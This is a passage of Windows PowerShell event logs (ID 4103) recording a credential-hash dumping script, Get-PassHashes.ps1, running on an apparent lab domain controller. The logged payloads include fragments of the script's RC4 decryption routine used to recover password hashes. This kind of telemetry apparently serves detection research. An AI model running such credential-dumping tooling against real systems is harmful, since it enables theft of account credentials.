        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 104
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.568566000Z" />
    <EventRecordID>14233</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-723b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 104
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;$j=0;"
ParameterBinding(ForEach-Object): name="Process"; value="
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        , ..."
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="16"
ParameterBinding(ForEach-Object): name="InputObject"; value="17"
ParameterBinding(ForEach-Object): name="InputObject"; value="18"
ParameterBinding(ForEach-Object): name="InputObject"; value="19"
ParameterBinding(ForEach-Object): name="InputObject"; value="20"
ParameterBinding(ForEach-Object): name="InputObject"; value="21"
ParameterBinding(ForEach-Object): name="InputObject"; value="22"
ParameterBinding(ForEach-Object): name="InputObject"; value="23"
ParameterBinding(ForEach-Object): name="InputObject"; value="24"
ParameterBinding(ForEach-Object): name="InputObject"; value="25"
ParameterBinding(ForEach-Object): name="InputObject"; value="26"
ParameterBinding(ForEach-Object): name="InputObject"; value="27"
ParameterBinding(ForEach-Object): name="InputObject"; value="28"
ParameterBinding(ForEach-Object): name="InputObject"; value="29"
ParameterBinding(ForEach-Object): name="InputObject"; value="30"
ParameterBinding(ForEach-Object): name="InputObject"; value="31"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 102
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.546512300Z" />
    <EventRecordID>14232</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-703b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 102
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;$j=0;"
ParameterBinding(ForEach-Object): name="Process"; value="
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        , ..."
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="16"
ParameterBinding(ForEach-Object): name="InputObject"; value="17"
ParameterBinding(ForEach-Object): name="InputObject"; value="18"
ParameterBinding(ForEach-Object): name="InputObject"; value="19"
ParameterBinding(ForEach-Object): name="InputObject"; value="20"
ParameterBinding(ForEach-Object): name="InputObject"; value="21"
ParameterBinding(ForEach-Object): name="InputObject"; value="22"
ParameterBinding(ForEach-Object): name="InputObject"; value="23"
ParameterBinding(ForEach-Object): name="InputObject"; value="24"
ParameterBinding(ForEach-Object): name="InputObject"; value="25"
ParameterBinding(ForEach-Object): name="InputObject"; value="26"
ParameterBinding(ForEach-Object): name="InputObject"; value="27"
ParameterBinding(ForEach-Object): name="InputObject"; value="28"
ParameterBinding(ForEach-Object): name="InputObject"; value="29"
ParameterBinding(ForEach-Object): name="InputObject"; value="30"
ParameterBinding(ForEach-Object): name="InputObject"; value="31"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="32"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 100
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.533516200Z" />
    <EventRecordID>14231</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-6f3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 100
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="32"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="[long]$j=0;"
ParameterBinding(ForEach-Object): name="Process"; value="
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                "
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="16"
ParameterBinding(ForEach-Object): name="InputObject"; value="17"
ParameterBinding(ForEach-Object): name="InputObject"; value="18"
ParameterBinding(ForEach-Object): name="InputObject"; value="19"
ParameterBinding(ForEach-Object): name="InputObject"; value="20"
ParameterBinding(ForEach-Object): name="InputObject"; value="21"
ParameterBinding(ForEach-Object): name="InputObject"; value="22"
ParameterBinding(ForEach-Object): name="InputObject"; value="23"
ParameterBinding(ForEach-Object): name="InputObject"; value="24"
ParameterBinding(ForEach-Object): name="InputObject"; value="25"
ParameterBinding(ForEach-Object): name="InputObject"; value="26"
ParameterBinding(ForEach-Object): name="InputObject"; value="27"
ParameterBinding(ForEach-Object): name="InputObject"; value="28"
ParameterBinding(ForEach-Object): name="InputObject"; value="29"
ParameterBinding(ForEach-Object): name="InputObject"; value="30"
ParameterBinding(ForEach-Object): name="InputObject"; value="31"
ParameterBinding(ForEach-Object): name="InputObject"; value="32"
ParameterBinding(ForEach-Object): name="InputObject"; value="33"
ParameterBinding(ForEach-Object): name="InputObject"; value="34"
ParameterBinding(ForEach-Object): name="InputObject"; value="35"
ParameterBinding(ForEach-Object): name="InputObject"; value="36"
ParameterBinding(ForEach-Object): name="InputObject"; value="37"
ParameterBinding(ForEach-Object): name="InputObject"; value="38"
ParameterBinding(ForEach-Object): name="InputObject"; value="39"
ParameterBinding(ForEach-Object): name="InputObject"; value="40"
ParameterBinding(ForEach-Object): name="InputObject"; value="41"
ParameterBinding(ForEach-Object): name="InputObject"; value="42"
ParameterBinding(ForEach-Object): name="InputObject"; value="43"
ParameterBinding(ForEach-Object): name="InputObject"; value="44"
ParameterBinding(ForEach-Object): name="InputObject"; value="45"
ParameterBinding(ForEach-Object): name="InputObject"; value="46"
ParameterBinding(ForEach-Object): name="InputObject"; value="47"
ParameterBinding(ForEach-Object): name="InputObject"; value="48"
ParameterBinding(ForEach-Object): name="InputObject"; value="49"
ParameterBinding(ForEach-Object): name="InputObject"; value="50"
ParameterBinding(ForEach-Object): name="InputObject"; value="51"
ParameterBinding(ForEach-Object): name="InputObject"; value="52"
ParameterBinding(ForEach-Object): name="InputObject"; value="53"
ParameterBinding(ForEach-Object): name="InputObject"; value="54"
ParameterBinding(ForEach-Object): name="InputObject"; value="55"
ParameterBinding(ForEach-Object): name="InputObject"; value="56"
ParameterBinding(ForEach-Object): name="InputObject"; value="57"
ParameterBinding(ForEach-Object): name="InputObject"; value="58"
ParameterBinding(ForEach-Object): name="InputObject"; value="59"
ParameterBinding(ForEach-Object): name="InputObject"; value="60"
ParameterBinding(ForEach-Object): name="InputObject"; value="61"
ParameterBinding(ForEach-Object): name="InputObject"; value="62"
ParameterBinding(ForEach-Object): name="InputObject"; value="63"
ParameterBinding(ForEach-Object): name="InputObject"; value="64"
ParameterBinding(ForEach-Object): name="InputObject"; value="65"
ParameterBinding(ForEach-Object): name="InputObject"; value="66"
ParameterBinding(ForEach-Object): name="InputObject"; value="67"
ParameterBinding(ForEach-Object): name="InputObject"; value="68"
ParameterBinding(ForEach-Object): name="InputObject"; value="69"
ParameterBinding(ForEach-Object): name="InputObject"; value="70"
ParameterBinding(ForEach-Object): name="InputObject"; value="71"
ParameterBinding(ForEach-Object): name="InputObject"; value="72"
ParameterBinding(ForEach-Object): name="InputObject"; value="73"
ParameterBinding(ForEach-Object): name="InputObject"; value="74"
ParameterBinding(ForEach-Object): name="InputObject"; value="75"
ParameterBinding(ForEach-Object): name="InputObject"; value="76"
ParameterBinding(ForEach-Object): name="InputObject"; value="77"
ParameterBinding(ForEach-Object): name="InputObject"; value="78"
ParameterBinding(ForEach-Object): name="InputObject"; value="79"
ParameterBinding(ForEach-Object): name="InputObject"; value="80"
ParameterBinding(ForEach-Object): name="InputObject"; value="81"
ParameterBinding(ForEach-Object): name="InputObject"; value="82"
ParameterBinding(ForEach-Object): name="InputObject"; value="83"
ParameterBinding(ForEach-Object): name="InputObject"; value="84"
ParameterBinding(ForEach-Object): name="InputObject"; value="85"
ParameterBinding(ForEach-Object): name="InputObject"; value="86"
ParameterBinding(ForEach-Object): name="InputObject"; value="87"
ParameterBinding(ForEach-Object): name="InputObject"; value="88"
ParameterBinding(ForEach-Object): name="InputObject"; value="89"
ParameterBinding(ForEach-Object): name="InputObject"; value="90"
ParameterBinding(ForEach-Object): name="InputObject"; value="91"
ParameterBinding(ForEach-Object): name="InputObject"; value="92"
ParameterBinding(ForEach-Object): name="InputObject"; value="93"
ParameterBinding(ForEach-Object): name="InputObject"; value="94"
ParameterBinding(ForEach-Object): name="InputObject"; value="95"
ParameterBinding(ForEach-Object): name="InputObject"; value="96"
ParameterBinding(ForEach-Object): name="InputObject"; value="97"
ParameterBinding(ForEach-Object): name="InputObject"; value="98"
ParameterBinding(ForEach-Object): name="InputObject"; value="99"
ParameterBinding(ForEach-Object): name="InputObject"; value="100"
ParameterBinding(ForEach-Object): name="InputObject"; value="101"
ParameterBinding(ForEach-Object): name="InputObject"; value="102"
ParameterBinding(ForEach-Object): name="InputObject"; value="103"
ParameterBinding(ForEach-Object): name="InputObject"; value="104"
ParameterBinding(ForEach-Object): name="InputObject"; value="105"
ParameterBinding(ForEach-Object): name="InputObject"; value="106"
ParameterBinding(ForEach-Object): name="InputObject"; value="107"
ParameterBinding(ForEach-Object): name="InputObject"; value="108"
ParameterBinding(ForEach-Object): name="InputObject"; value="109"
ParameterBinding(ForEach-Object): name="InputObject"; value="110"
ParameterBinding(ForEach-Object): name="InputObject"; value="111"
ParameterBinding(ForEach-Object): name="InputObject"; value="112"
ParameterBinding(ForEach-Object): name="InputObject"; value="113"
ParameterBinding(ForEach-Object): name="InputObject"; value="114"
ParameterBinding(ForEach-Object): name="InputObject"; value="115"
ParameterBinding(ForEach-Object): name="InputObject"; value="116"
ParameterBinding(ForEach-Object): name="InputObject"; value="117"
ParameterBinding(ForEach-Object): name="InputObject"; value="118"
ParameterBinding(ForEach-Object): name="InputObject"; value="119"
ParameterBinding(ForEach-Object): name="InputObject"; value="120"
ParameterBinding(ForEach-Object): name="InputObject"; value="121"
ParameterBinding(ForEach-Object): name="InputObject"; value="122"
ParameterBinding(ForEach-Object): name="InputObject"; value="123"
ParameterBinding(ForEach-Object): name="InputObject"; value="124"
ParameterBinding(ForEach-Object): name="InputObject"; value="125"
ParameterBinding(ForEach-Object): name="InputObject"; value="126"
ParameterBinding(ForEach-Object): name="InputObject"; value="127"
ParameterBinding(ForEach-Object): name="InputObject"; value="128"
ParameterBinding(ForEach-Object): name="InputObject"; value="129"
ParameterBinding(ForEach-Object): name="InputObject"; value="130"
ParameterBinding(ForEach-Object): name="InputObject"; value="131"
ParameterBinding(ForEach-Object): name="InputObject"; value="132"
ParameterBinding(ForEach-Object): name="InputObject"; value="133"
ParameterBinding(ForEach-Object): name="InputObject"; value="134"
ParameterBinding(ForEach-Object): name="InputObject"; value="135"
ParameterBinding(ForEach-Object): name="InputObject"; value="136"
ParameterBinding(ForEach-Object): name="InputObject"; value="137"
ParameterBinding(ForEach-Object): name="InputObject"; value="138"
ParameterBinding(ForEach-Object): name="InputObject"; value="139"
ParameterBinding(ForEach-Object): name="InputObject"; value="140"
ParameterBinding(ForEach-Object): name="InputObject"; value="141"
ParameterBinding(ForEach-Object): name="InputObject"; value="142"
ParameterBinding(ForEach-Object): name="InputObject"; value="143"
ParameterBinding(ForEach-Object): name="InputObject"; value="144"
ParameterBinding(ForEach-Object): name="InputObject"; value="145"
ParameterBinding(ForEach-Object): name="InputObject"; value="146"
ParameterBinding(ForEach-Object): name="InputObject"; value="147"
ParameterBinding(ForEach-Object): name="InputObject"; value="148"
ParameterBinding(ForEach-Object): name="InputObject"; value="149"
ParameterBinding(ForEach-Object): name="InputObject"; value="150"
ParameterBinding(ForEach-Object): name="InputObject"; value="151"
ParameterBinding(ForEach-Object): name="InputObject"; value="152"
ParameterBinding(ForEach-Object): name="InputObject"; value="153"
ParameterBinding(ForEach-Object): name="InputObject"; value="154"
ParameterBinding(ForEach-Object): name="InputObject"; value="155"
ParameterBinding(ForEach-Object): name="InputObject"; value="156"
ParameterBinding(ForEach-Object): name="InputObject"; value="157"
ParameterBinding(ForEach-Object): name="InputObject"; value="158"
ParameterBinding(ForEach-Object): name="InputObject"; value="159"
ParameterBinding(ForEach-Object): name="InputObject"; value="160"
ParameterBinding(ForEach-Object): name="InputObject"; value="161"
ParameterBinding(ForEach-Object): name="InputObject"; value="162"
ParameterBinding(ForEach-Object): name="InputObject"; value="163"
ParameterBinding(ForEach-Object): name="InputObject"; value="164"
ParameterBinding(ForEach-Object): name="InputObject"; value="165"
ParameterBinding(ForEach-Object): name="InputObject"; value="166"
ParameterBinding(ForEach-Object): name="InputObject"; value="167"
ParameterBinding(ForEach-Object): name="InputObject"; value="168"
ParameterBinding(ForEach-Object): name="InputObject"; value="169"
ParameterBinding(ForEach-Object): name="InputObject"; value="170"
ParameterBinding(ForEach-Object): name="InputObject"; value="171"
ParameterBinding(ForEach-Object): name="InputObject"; value="172"
ParameterBinding(ForEach-Object): name="InputObject"; value="173"
ParameterBinding(ForEach-Object): name="InputObject"; value="174"
ParameterBinding(ForEach-Object): name="InputObject"; value="175"
ParameterBinding(ForEach-Object): name="InputObject"; value="176"
ParameterBinding(ForEach-Object): name="InputObject"; value="177"
ParameterBinding(ForEach-Object): name="InputObject"; value="178"
ParameterBinding(ForEach-Object): name="InputObject"; value="179"
ParameterBinding(ForEach-Object): name="InputObject"; value="180"
ParameterBinding(ForEach-Object): name="InputObject"; value="181"
ParameterBinding(ForEach-Object): name="InputObject"; value="182"
ParameterBinding(ForEach-Object): name="InputObject"; value="183"
ParameterBinding(ForEach-Object): name="InputObject"; value="184"
ParameterBinding(ForEach-Object): name="InputObject"; value="185"
ParameterBinding(ForEach-Object): name="InputObject"; value="186"
ParameterBinding(ForEach-Object): name="InputObject"; value="187"
ParameterBinding(ForEach-Object): name="InputObject"; value="188"
ParameterBinding(ForEach-Object): name="InputObject"; value="189"
ParameterBinding(ForEach-Object): name="InputObject"; value="190"
ParameterBinding(ForEach-Object): name="InputObject"; value="191"
ParameterBinding(ForEach-Object): name="InputObject"; value="192"
ParameterBinding(ForEach-Object): name="InputObject"; value="193"
ParameterBinding(ForEach-Object): name="InputObject"; value="194"
ParameterBinding(ForEach-Object): name="InputObject"; value="195"
ParameterBinding(ForEach-Object): name="InputObject"; value="196"
ParameterBinding(ForEach-Object): name="InputObject"; value="197"
ParameterBinding(ForEach-Object): name="InputObject"; value="198"
ParameterBinding(ForEach-Object): name="InputObject"; value="199"
ParameterBinding(ForEach-Object): name="InputObject"; value="200"
ParameterBinding(ForEach-Object): name="InputObject"; value="201"
ParameterBinding(ForEach-Object): name="InputObject"; value="202"
ParameterBinding(ForEach-Object): name="InputObject"; value="203"
ParameterBinding(ForEach-Object): name="InputObject"; value="204"
ParameterBinding(ForEach-Object): name="InputObject"; value="205"
ParameterBinding(ForEach-Object): name="InputObject"; value="206"
ParameterBinding(ForEach-Object): name="InputObject"; value="207"
ParameterBinding(ForEach-Object): name="InputObject"; value="208"
ParameterBinding(ForEach-Object): name="InputObject"; value="209"
ParameterBinding(ForEach-Object): name="InputObject"; value="210"
ParameterBinding(ForEach-Object): name="InputObject"; value="211"
ParameterBinding(ForEach-Object): name="InputObject"; value="212"
ParameterBinding(ForEach-Object): name="InputObject"; value="213"
ParameterBinding(ForEach-Object): name="InputObject"; value="214"
ParameterBinding(ForEach-Object): name="InputObject"; value="215"
ParameterBinding(ForEach-Object): name="InputObject"; value="216"
ParameterBinding(ForEach-Object): name="InputObject"; value="217"
ParameterBinding(ForEach-Object): name="InputObject"; value="218"
ParameterBinding(ForEach-Object): name="InputObject"; value="219"
ParameterBinding(ForEach-Object): name="InputObject"; value="220"
ParameterBinding(ForEach-Object): name="InputObject"; value="221"
ParameterBinding(ForEach-Object): name="InputObject"; value="222"
ParameterBinding(ForEach-Object): name="InputObject"; value="223"
ParameterBinding(ForEach-Object): name="InputObject"; value="224"
ParameterBinding(ForEach-Object): name="InputObject"; value="225"
ParameterBinding(ForEach-Object): name="InputObject"; value="226"
ParameterBinding(ForEach-Object): name="InputObject"; value="227"
ParameterBinding(ForEach-Object): name="InputObject"; value="228"
ParameterBinding(ForEach-Object): name="InputObject"; value="229"
ParameterBinding(ForEach-Object): name="InputObject"; value="230"
ParameterBinding(ForEach-Object): name="InputObject"; value="231"
ParameterBinding(ForEach-Object): name="InputObject"; value="232"
ParameterBinding(ForEach-Object): name="InputObject"; value="233"
ParameterBinding(ForEach-Object): name="InputObject"; value="234"
ParameterBinding(ForEach-Object): name="InputObject"; value="235"
ParameterBinding(ForEach-Object): name="InputObject"; value="236"
ParameterBinding(ForEach-Object): name="InputObject"; value="237"
ParameterBinding(ForEach-Object): name="InputObject"; value="238"
ParameterBinding(ForEach-Object): name="InputObject"; value="239"
ParameterBinding(ForEach-Object): name="InputObject"; value="240"
ParameterBinding(ForEach-Object): name="InputObject"; value="241"
ParameterBinding(ForEach-Object): name="InputObject"; value="242"
ParameterBinding(ForEach-Object): name="InputObject"; value="243"
ParameterBinding(ForEach-Object): name="InputObject"; value="244"
ParameterBinding(ForEach-Object): name="InputObject"; value="245"
ParameterBinding(ForEach-Object): name="InputObject"; value="246"
ParameterBinding(ForEach-Object): name="InputObject"; value="247"
ParameterBinding(ForEach-Object): name="InputObject"; value="248"
ParameterBinding(ForEach-Object): name="InputObject"; value="249"
ParameterBinding(ForEach-Object): name="InputObject"; value="250"
ParameterBinding(ForEach-Object): name="InputObject"; value="251"
ParameterBinding(ForEach-Object): name="InputObject"; value="252"
ParameterBinding(ForEach-Object): name="InputObject"; value="253"
ParameterBinding(ForEach-Object): name="InputObject"; value="254"
ParameterBinding(ForEach-Object): name="InputObject"; value="255"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 98
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.530076300Z" />
    <EventRecordID>14230</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-6e3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 98
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="[long]$j=0;"
ParameterBinding(ForEach-Object): name="Process"; value="
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
